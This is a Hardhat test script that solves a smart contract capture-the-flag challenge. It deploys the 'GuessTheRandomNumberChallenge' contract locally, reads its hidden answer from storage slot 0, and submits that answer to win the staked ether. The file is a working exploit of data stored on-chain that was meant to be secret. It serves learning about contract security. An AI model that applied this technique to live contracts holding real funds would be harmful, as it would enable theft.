import { expect } from 'chai';
import { ethers } from 'hardhat';

describe('GuessTheRandomNumberChallenge', function () {
  it('Exploit', async function () {
    // Deploy the contract with 1 ether from the deployer
    const [deployer] = await ethers.getSigners();
    const Challenge = await ethers.getContractFactory('GuessTheRandomNumberChallenge');
    const challenge = await Challenge.deploy({ value: ethers.utils.parseEther('1') });
    await challenge.deployed();

    console.log(`Challenge deployed at address: ${challenge.address}`);

    // Read the answer directly from storage slot 0
    const answerHash = await ethers.provider.getStorageAt(challenge.address, 0);
    const answer = ethers.BigNumber.from(answerHash);

    console.log(`Answer retrieved from storage: ${answer.toString()}`);

    // Make the guess with the correct answer
    const tx = await challenge.guess(answer, { value: ethers.utils.parseEther('1') });
    await tx.wait();

    // Check if the challenge is complete
    expect(await challenge.isComplete()).to.be.true;
  });
});
